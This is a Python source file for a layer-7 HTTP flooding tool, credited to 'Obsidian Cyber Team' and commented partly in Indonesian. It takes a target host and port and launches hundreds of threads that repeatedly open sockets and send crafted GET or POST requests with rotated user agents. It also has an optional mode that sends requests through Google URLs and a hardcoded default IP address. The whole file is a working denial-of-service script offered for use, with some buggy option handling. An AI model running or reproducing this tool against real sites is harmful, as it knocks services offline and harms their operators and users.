from queue import Queue
from optparse import OptionParser
import time,sys,socket,threading,logging,urllib.request,random

def sedot_parameters():
	global ip,host,port,thr,item,referer,uri,path,method,isbot
	ip = "118.98.73.214" 
	host = "www.google.com"
	port = 80
	thr  = 500
	path = "/" 		
	uri = "/"   				# lokasi/halaman dimana website gk redirect lgi misalnya: /index.jsp
	method = "GET"				# GET / POST
	data_post = ""				# dipakai hanya untuk method = POST, misalnya: user=test&pass=test
	isbot=0
	
	optp = OptionParser(add_help_option=False,epilog="Hammers")
	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
	optp.add_option("-s","--host", dest="host",help="attack to server host --host www.target.com")
	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
	optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 200 -t 200")
	optp.add_option("-a","--path",dest="path",help="default /  -a /db.php")
	optp.add_option("-u","--uri",dest="uri",help="default /  -u /index.jsp")
	optp.add_option("-m","--method",dest="method",help="default GET  -m GET")
	optp.add_option("-d","--data",dest="data",help="default  -d user=test&pass=test")
	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
	opts, args = optp.parse_args()
	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
	if opts.help:
		usage()
	if opts.host is None:
		usage()
	else:
		host = opts.host
	if opts.port is None:
		port = 80
	else:
		port = opts.port
	if opts.turbo is None:
		thr = 200
	else:
		thr = opts.turbo
	if opts.path is None:
		path = "/"
	else:
		path = opts.path
	if opts.uri is None:
		uri = "/"
	else:
		uri = opts.uri
	if opts.method is None:
		uri = "GET"
	else:
		uri = opts.method
	if opts.data is None:
		data_post = ""
	else:
		data_post = opts.data

def usage():
	print ('''
	-s or --host = "www.google.com"
	-p or --port = 80 > 80 (http) or 443 (htttps)
	-t or --turbo  = 200 > defaul 200
	-a or --path = "/" > serangan spesifik 
	-u or --uri = "/" > lokasi/halaman dimana website gk redirect lgi misalnya: /index.jsp 
	
	-m or --method = "GET" > GET / POST
	-d or --data = "" > dipakai hanya untuk method = POST, misalnya: user=test&pass=test
	''')
	sys.exit()
	
def my_bots():
	global bots
	bots=[]
	#contoh bot aja bro.. 
	bot1="https://www.google.com/?q="
	bots.append(bot1)
	return(bots)
	
def user_agent():
	global uagent
	uagent=[]
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	return(uagent)

def bot_hammering(url):
	try:
		while True:
			sys.stdout.write("Bot>>fire . . .")
			sys.stdout.write('\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b')
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
			time.sleep(.1)
	except:
		time.sleep(.1)
			
def down_it(item):
	try:
		while True:
			if(port==80):
				referer="http://"
			elif(port==443):
				referer="https://"
			
			if(method=="GET"):
				packet = str("GET "+path+" HTTP/1.1\nReferer: "+referer+host+uri+"\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
			elif(method=="POST"):
				packet = str("POST "+path+" HTTP/1.1\nReferer: "+referer+host+uri+"\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data+"\n\n"+data_post).encode('utf-8')
			else:
				print("error detected")
				
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,int(port)))
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				sys.stdout.write("Attacking . . .")
				sys.stdout.write('\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b')
				
			else:
				s.shutdown(1)
				print("shut<->down")
			time.sleep(.1)
	except socket.error as e:
		print("no connection! server maybe down")
		time.sleep(.1)

def dos():
	while True:
		item = q.get()
		down_it(item)
		q.task_done()


def dos2():
	while True:
		item=w.get()
		bot_hammering(random.choice(bots)+ip)
		w.task_done()


def exit():
	sys.exit()

global data
data ='''Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 115
Connection: keep-alive''';
 
#task queue are q,w
q = Queue()
w = Queue()

if __name__ == '__main__':
	sedot_parameters()
	print("")
	print("//////////////////////////////////////")
	print("//         Layer 7 Attack           //")
	print("//   [+] Obsidian Cyber Team [+]    //")
	print("//       .:: MusH4ck007 ::.         //")
	print("/////////////////////////////////////")
	print("")
	print("Target Lock In :")
	print("Web: ",host)
	print("Port: ",str(port))
	print("Turbo: ",str(thr))
	print("URI: ",uri)
	print("Specific to : ",path)
	print("")
	print("Please wait . . .\n")
	user_agent()
	my_bots()
	time.sleep(5)
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,int(port)))
		s.settimeout(1)
	except socket.error as e:
		print("check server ip and port")
		exit()
	while True:
		for i in range(int(thr)):
			t = threading.Thread(target=dos)
			t.daemon = True
			t.start()
			if(isbot==1):
				t2 = threading.Thread(target=dos2)
				t2.daemon = True
				t2.start()
		start = time.time()
		#tasking
		item = 0
		while True:
			if (item>1800):
				item=0
				time.sleep(.1)
			item = item + 1
			q.put(item)
			w.put(item)
		q.join()
		w.join()
